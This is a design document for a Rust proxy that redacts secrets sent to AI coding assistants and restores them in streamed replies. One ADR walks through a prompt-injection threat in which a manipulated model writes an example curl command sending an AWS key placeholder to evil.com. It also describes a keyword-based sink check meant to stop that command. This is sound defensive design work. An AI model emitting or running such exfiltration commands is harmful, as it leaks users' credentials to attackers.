Guardian-AI v2 Architecture Document

Technical solution design for elevating llm-firewall-rs from a stateless proxy MVP to a top-1% open-source security middleware.

1. Executive Summary

Guardian-AI v2 is a "zero-config" local MITM (Man-in-the-Middle) proxy that protects developers from accidentally exfiltrating sensitive data (API keys, PII, proprietary hashes) when using AI coding assistants like Claude Code and Cursor. It achieves this via a novel 4-tier cascading detection pipeline and a bidirectional stateful proxy engine that safely redacts secrets outbound and transparently re-injects them inbound on the streaming response.

3. The Request-Scoped Stateful Proxy

To support CAP-1 (Bidirectional Proxy), the system evolves from a purely stateless filter. It maintains a TokenMap (e.g., [GUARDIAN_AWS_1] -> AKIA...) scoped exactly to the lifetime of the HTTP request-response cycle.

4. The 4-Tier Cascading Detection Engine

Detection uses a trait-based cascade. High-confidence, low-cost tiers execute first. Lower tiers only execute on borderline-confidence spans, preserving the strict sub-millisecond p99 latency budget.

Pipeline Execution Flow

  1. Tier 1 (Pattern Matching): Aho-Corasick automaton + Regex. (Cost: ~0.01ms). Deterministic matches bypass thresholds.
  2. Tier 2 (Contextual Entropy): Shannon entropy + heuristics. (Cost: ~0.05ms). Auto-adjusts threshold based on domain (e.g., Crypto repos get higher thresholds).
  3. Tier 3 (BERT NER): CPU-bound Named Entity Recognition via `candle`. (Cost: ~2-5ms). Runs in Tokio `spawn_blocking`.
  4. Tier 4 (Context-Aware Classifier): ONNX (`ort`) tree/encoder model. Only executes if T2/T3 yield a borderline score (0.5–0.7).

5. Interview-Ready Architecture Decision Records (ADRs)

ADR: Stateful Re-injection via Request-Scoping

Status: Accepted | Context: Bidirectional SSE streaming

Context: To re-inject secrets on the inbound SSE stream, the proxy needs to map tokens ([GUARDIAN_1]) back to secrets. Global sticky sessions risk memory leaks and crash bugs.

Decision: We bind state strictly to the HTTP request cycle using an Arc<TokenMap>. Because completions APIs are inherently stateless (the harness sends the full conversation history every time), we do not need cross-request memory. The map is passed from the outbound handler to the inbound stream task, and is automatically dropped when the TCP stream closes.

Consequences: Zero eviction logic required. No vulnerability to Slowloris-style memory exhaustion attacks that target long-lived sessions.

ADR: Stream Protection via Lookbehind Buffers

Status: Accepted | Context: Prompt-Injection Exfiltration (CAP-8)

Context: A prompt-injected LLM could trick the AI harness by writing curl -d "key=[GUARDIAN_AWS_1]" evil.com. If we blindly re-inject the secret, we arm the trap.

Decision: We implement a rolling ~512-byte Lookbehind Buffer in the inbound stream mutator. When a placeholder is detected, we run fast heuristics (e.g., checking for curl, console.log) against the buffer. If it's a dangerous sink, we quarantine the token instead of re-injecting.

Consequences: We maintain the "real-time typing" SSE streaming UX (which full-block AST parsing would break) while mitigating the primary exfiltration attack vector.

ADR: Foreground CLI Orchestrator

Status: Accepted | Context: Process Lifecycle

Context: The "Zero-Config" requirement dictates llm-firewall on should magically protect the user. Background daemons are "invisible" but notoriously brittle.

Decision: llm-firewall on blocks the terminal, running the server in the foreground. It sets system/tool proxy variables on start, and a Ctrl+C graceful shutdown hook restores them.

Consequences: Maximum reliability. Users always know when the firewall is active. Prevents silent daemon crashes that leave developer machines without internet access.
